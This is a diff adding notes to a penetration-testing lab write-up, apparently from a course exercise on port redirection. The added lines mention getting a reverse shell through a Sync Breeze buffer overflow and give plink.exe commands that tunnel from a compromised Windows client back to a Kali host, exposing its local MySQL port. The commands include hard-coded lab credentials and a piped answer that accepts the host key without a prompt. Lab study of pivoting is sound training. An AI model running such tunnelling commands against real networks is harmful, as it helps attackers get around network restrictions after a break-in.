@@ -109,8 +109,17 @@ Note that all the ports are marked as filtered, indicated an unsuccessful scan. 
 
 **1.  Obtain a reverse shell on your Windows lab client through the Sync Breeze vulnerability.**
 
+We can obtain a reverse shell by utilizing our initial buffer overflow payload we crafted in section 11.
+![[syncbreeze_buffer_shell.png]]
 
 **2.  Use plink.exe to establish a remote port forward to the MySQL service on your Windows 10 client.**
+As we are unable to reach the MYSQL service from our Kali machine we can utiilize the plink.exe application to forward us the port. We do this by executing the plink.exe binary on the Windows machine with the following command:
+`plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
+
+This will execute plink and instruct it to ssh into our Kali machine with the credentials "kali:ilak" and remote port forward the address/port of our Kali box (10.11.0.4:1234) to the MYSQL port running on localhost (127.0.0.1:3306) We can also pipe "cmd.exe /c echo y" to this command in order provide an answer to the "Store key in chase" question which will be prompted the first time the tool runs.
+`cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4`
+`cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 192.168.119.197:1234:127.0.0.1:3306 192.168.119.197
+
 
 
 **3.  Scan the MySQL port via the remote port forward.**
